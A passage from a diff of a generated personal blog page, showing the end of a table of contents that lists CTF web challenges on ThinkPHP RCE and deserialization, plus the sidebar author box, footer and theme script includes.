href="#Web579-610-TP5-rce"><span class="nav-number">10.</span> <span class="nav-text">Web579-610 TP5 rce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web606"><span class="nav-number">11.</span> <span class="nav-text">web606</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#611-TP-5-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">12.</span> <span class="nav-text">611 TP 5.1 反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#612-622-5-1%E5%8F%98%E5%BD%A2"><span class="nav-number">13.</span> <span class="nav-text">612-622 5.1变形</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#623-625-TP6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">14.</span> <span class="nav-text">623-625 TP6 反序列化</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
